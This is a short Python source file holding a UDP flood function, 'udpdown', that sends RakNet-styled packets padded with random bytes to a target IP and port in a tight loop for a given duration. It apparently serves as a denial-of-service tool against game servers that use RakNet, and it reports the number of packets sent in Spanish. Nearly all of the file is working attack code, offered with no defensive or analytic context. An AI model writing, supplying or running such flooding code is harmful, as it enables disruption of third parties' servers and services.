import socket
import time
import random

def generate_raknet_packet(size=1460):
    header = b'\x00'
    magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
    payload_size = size - len(header) - len(magic)
    if payload_size < 0:
        payload_size = 0
    payload = random.randbytes(payload_size)
    return header + magic + payload

async def udpdown(ip: str, port: int, duration: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1460
    end_time = time.time() + duration
    sent = 0
    try:
        while time.time() < end_time:
            raknet_packet = generate_raknet_packet(packet_size)
            s.sendto(raknet_packet, (ip, port))
            sent += 1
            time.sleep(0.001)
    except Exception as e:
        return f"[UDPDown Error] {e}"
    finally:
        s.close()
    return f"UDPDown terminado. Paquetes enviados: {sent}"
